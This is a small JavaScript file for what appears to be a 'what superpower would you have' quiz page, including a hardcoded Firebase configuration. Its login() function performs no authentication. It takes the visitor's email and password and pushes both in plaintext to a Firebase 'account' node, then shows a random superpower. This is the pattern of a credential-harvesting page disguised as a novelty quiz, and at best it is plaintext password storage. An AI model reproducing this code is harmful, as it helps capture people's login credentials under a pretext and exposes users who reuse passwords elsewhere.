function chouse()
{
    var power=["Invisibility","Strength","Flying","Shapeshifting","Speed","Teleportation","Regeneration","Mindcontrole","","Wealth"];
    var a=Math.floor(Math.random() * 10);
    return power[a];
}


function htren()
{
    var name=chouse();
    var src="../images/" + name + ".jpg"; 
    var a="if you hade a super power it will be " + name;
    return `
    <div id="new">
        <p id="p-power">${a}<p>
    </div>
    `;
}


function login()
{
    var firebaseConfig = {
        apiKey: "AIzaSyApKazZ3P0q9dNpTwRELdF0fjHvXoPZutQ",
        authDomain: "porje-7e37c.firebaseapp.com",
        databaseURL: "https://porje-7e37c.firebaseio.com",
        projectId: "porje-7e37c",
        storageBucket: "porje-7e37c.appspot.com",
        messagingSenderId: "508714269631",
        appId: "1:508714269631:web:dfde9b92b99d31140dbf0a"
      };

    firebase.initializeApp(firebaseConfig);
    var email;
    var pswd;
    email=document.getElementById("email").value;
    pswd=document.getElementById("pswd").value;
    if(email!="" && pswd!="")
    {
        var database=firebase.database();
        var ref=database.ref('account');
        var data={
            eml : email,
            pwd : pswd
        }
        ref.push(data);
        document.getElementById("tot").innerHTML=htren();
    }
}

